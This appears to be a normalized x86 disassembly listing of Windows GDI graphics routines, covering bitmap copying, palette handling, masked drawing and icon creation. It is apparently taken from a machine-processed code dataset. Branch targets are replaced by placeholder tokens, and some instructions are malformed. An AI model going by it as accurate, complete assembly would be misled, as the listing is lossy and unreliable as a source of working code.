mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_424764
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_423cc8
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_423cc8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_423da8
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_423c8c
call sub_422fe8
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_423c8c
call sub_422fe8
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_424894
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4248de
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4248e5
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_4248e8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_424984
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_424894
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404214
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc28
call sub_4039e0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42498b
lea eax [ ebp - 0x104 ]
call sub_403fa4
retn
sub_4249a0
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_424aee
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_424a5d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_4248e8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_4248e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424af5
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_424b00
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_424b34
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_424990
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_424db4
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424990
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424dbb
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424990
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_424c07
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406e5c
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424dbb
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_424dc8
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_424e00
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402c68
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_424e78
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_424ed0
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4029c0
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424fcd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424fd4
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_424fe8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_42506e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_425080
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4029c0
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_424e78
mov eax esp
call sub_424fe8
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_425124
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_424e78
mov [ esp ] eax
sub_425178
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424b20
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_424b00
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_425324
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424990
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42524a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_4249a0
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425251
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_424894
sub_425251
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_424b20
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_424990
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_425304
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_4249a0
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42530b
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_425340
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_4253d0
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_408034
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4256c7
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_4254b9
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_424894
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4254c0
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4254c0
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_425334
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_408034
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_4256a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_425178
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_408034
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_425684
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42568b
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4027e4
retn
call sub_4248e8
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_425334
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_425340
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_4256f0
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_424870
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402c68
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424b20
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_4257d4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_4256f0
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_425840
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_4256f0
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4258dd
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
